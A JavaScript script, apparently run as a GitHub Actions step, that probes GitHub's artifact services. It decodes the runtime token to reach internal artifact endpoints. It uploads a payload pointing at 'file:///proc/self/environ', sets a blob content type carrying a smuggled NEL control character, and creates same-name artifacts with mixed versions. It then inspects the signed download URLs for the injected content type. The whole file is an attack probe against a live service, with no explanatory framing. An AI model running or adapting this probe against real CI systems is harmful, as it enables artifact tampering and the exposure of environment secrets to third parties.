module.exports = async function scan({context}) {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const runtimeUrl = process.env.ACTIONS_RUNTIME_URL;
  const resultsUrl = process.env.ACTIONS_RESULTS_URL;
  if (!runtimeToken || !runtimeUrl || !resultsUrl) throw new Error('Actions runtime variables unavailable');

  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString('utf8'));
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, runBackendId, jobBackendId] = scope.split(':');
  const ids = {workflow_run_backend_id: runBackendId, workflow_job_run_backend_id: jobBackendId};
  const twirpBase = `${new URL(resultsUrl).origin}/twirp/github.actions.results.api.v1.ArtifactService`;
  const headers = {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json', 'Accept': 'application/json'};
  const weird = 'application/json\u0085';
  const payload = Buffer.from('{"full_name":"x/y","owner":{"avatar_url":"file:///proc/self/environ"}}');

  async function twirp(method, body) {
    const response = await fetch(`${twirpBase}/${method}`, {method: 'POST', headers, body: JSON.stringify(body)});
    return {status: response.status, data: await response.json().catch(() => ({}))};
  }

  // The old FileContainer API predates the v4+ Twirp artifact service.
  const legacyBase = new URL(`_apis/pipelines/workflows/${context.runId}/artifacts`, runtimeUrl);
  const legacyName = `legacy-nel-${Date.now()}`;
  for (const suffix of [`?artifactName=${legacyName}&api-version=6.0-preview`, '?api-version=6.0-preview']) {
    const response = await fetch(legacyBase + suffix, {
      method: 'POST', headers,
      body: JSON.stringify({Type: 'actions_storage', Name: legacyName, Properties: {ArtifactSize: String(payload.length)}}),
    });
    const data = await response.json().catch(() => ({}));
    console.log(`Legacy Create: HTTP ${response.status}; keys=${Object.keys(data).join(',')}; message=${JSON.stringify(String(data.message || data.msg || '').slice(0, 130))}`);
    if (response.ok && data.fileContainerResourceUrl) {
      const url = new URL(data.fileContainerResourceUrl);
      url.searchParams.set('itemPath', `${legacyName}/raw.json`);
      const upload = await fetch(url, {
        method: 'PUT',
        headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/octet-stream', 'Content-Length': String(payload.length)},
        body: payload,
      });
      console.log(`Legacy PUT: HTTP ${upload.status}; Content-Type=${JSON.stringify(upload.headers.get('content-type'))}`);
      const check = await fetch(`https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}/artifacts`, {
        headers: {'Authorization': `Bearer ${process.env.GH_TOKEN}`, 'Accept': 'application/vnd.github.v3+json'},
      });
      const list = await check.json().catch(() => ({}));
      for (const item of (list.artifacts || []).filter(a => a.name === legacyName)) {
        const download = await fetch(`https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/artifacts/${item.id}/zip`, {
          redirect: 'manual', headers: {'Authorization': `Bearer ${process.env.GH_TOKEN}`, 'Accept': 'application/vnd.github.v3+json'},
        });
        const location = download.headers.get('location');
        console.log(`Legacy REST: id=${item.id}; HTTP ${download.status}; rsct=${JSON.stringify(location ? new URL(location).searchParams.get('rsct') : null)}`);
      }
      break;
    }
  }

  async function put(url) {
    const response = await fetch(url, {method: 'PUT', headers: {
      'Content-Type': 'application/octet-stream', 'x-ms-version': '2025-01-05',
      'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': weird,
    }, body: payload});
    return response.status;
  }
  async function inspect(id, label) {
    const download = await fetch(`https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/artifacts/${id}/zip`, {
      redirect: 'manual', headers: {'Authorization': `Bearer ${process.env.GH_TOKEN}`, 'Accept': 'application/vnd.github.v3+json'},
    });
    const location = download.headers.get('location');
    console.log(`${label}: id=${id}; HTTP ${download.status}; rsct=${JSON.stringify(location ? new URL(location).searchParams.get('rsct') : null)}`);
  }

  const name = `mixed-version-${Date.now()}`;
  const first = await twirp('CreateArtifact', {...ids, name, version: 6, mime_type: weird});
  console.log(`Create v6: HTTP ${first.status}; ok=${Boolean(first.data.ok)}`);
  if (first.status !== 200 || !first.data.ok) return;
  const firstUrl = first.data.signed_upload_url || first.data.signedUploadUrl;
  console.log(`PUT v6: HTTP ${await put(firstUrl)}`);
  const second = await twirp('CreateArtifact', {...ids, name, version: 7, mime_type: 'application/json'});
  console.log(`Create same-name v7 before finalize: HTTP ${second.status}; ok=${Boolean(second.data.ok)}; message=${JSON.stringify(String(second.data.msg || '').slice(0, 130))}`);
  if (second.status === 200 && second.data.ok) {
    const secondUrl = second.data.signed_upload_url || second.data.signedUploadUrl;
    console.log(`PUT v7: HTTP ${await put(secondUrl)}`);
  }
  const final = await twirp('FinalizeArtifact', {...ids, name, size: String(payload.length)});
  const id = String(final.data.artifact_id || final.data.artifactId || '');
  console.log(`Finalize mixed-name: HTTP ${final.status}; ok=${Boolean(final.data.ok)}; id=${id}`);
  if (final.status === 200 && final.data.ok && /^\d+$/.test(id)) await inspect(id, 'Mixed REST');
};
